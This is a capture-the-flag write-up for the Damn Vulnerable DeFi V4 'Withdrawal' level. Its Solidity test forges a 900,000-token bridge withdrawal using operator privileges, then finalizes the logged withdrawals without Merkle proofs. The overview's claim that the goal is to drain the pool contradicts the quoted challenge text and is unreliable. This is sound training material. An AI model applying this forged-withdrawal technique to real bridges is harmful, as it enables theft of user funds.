# Withdrawal

There's a token bridge to withdraw Damn Valuable Tokens from an L2 to L1. It has a million DVT tokens in balance.

The L1 side of the bridge allows anyone to finalize withdrawals, as long as the delay period has passed and they present a valid Merkle proof. The proof must correspond with the latest withdrawals' root set by the bridge owner.

You were given the event logs of 4 withdrawals initiated on L2 in a JSON file. They could be executed on L1 after the 7 days delay.

But there's one suspicious among them, isn't there? You may want to double-check, because all funds might be at risk. Luckily you are a bridge operator with special powers.

Protect the bridge by finalizing _all_ given withdrawals, preventing the suspicious one from executing, and somehow not draining all funds.


# Challenge overview

[official site](https://damnvulnerabledefi.xyz/challenges/withdrawal)  
I am trying to reduce fluffs and indirect stuffs as much as posible

## Let’s dive

The Wihdrawal challenge is the final level in the Damn Vulnerable DeFi V4 series. The goal is simple: Drain all the tokens from the pool. It is the easiest level in this series. You just need to read all the contracts yourself. Player address has the `Operator` access and this privillege allows player to withdraw without verifiying merkle tree.

## POC
``` solidity
    function test_withdrawal() public checkSolvedByPlayer {

        // fake withdrawal operation and obtain tokens
        bytes memory message = abi.encodeCall(
            L1Forwarder.forwardMessage,
            (
                0, // nonce
                address(0), //  
                address(l1TokenBridge), // target
                abi.encodeCall( // message
                    TokenBridge.executeTokenWithdrawal,
                    (
                        player, // deployer receiver
                        900_000e18 //rescue 900_000e18
                    )
                )
            )
        );

        l1Gateway.finalizeWithdrawal(
            0, // nonce
            l2Handler, // pretend l2Handler 
            address(l1Forwarder), // target is l1Forwarder
            block.timestamp - 7 days, // to pass 7 days waiting peroid
            message, 
            new bytes32[](0)   
        );

        // Perform finalizedWithdrawals due to we are operator, don't need to provide merkleproof.
        
        vm.warp(1718786915 + 8 days);
        // first finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            0, // nonce 0
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718786915, // timestamp
            hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );

        // second finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            1, // nonce 1
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718786965, // timestamp
            hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );

        // third finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            2, // nonce 2
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718787050, // timestamp
            hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );

        // fourth finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            3, // nonce 3
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718787127, // timestamp
            hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );
 
        token.transfer(address(l1TokenBridge),900_000e18);
        console.log("token.balanceOf(address(l1TokenBridge)",token.balanceOf(address(l1TokenBridge)));
        
    }
```


>Okay! This Much 

### If you found this write up useful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**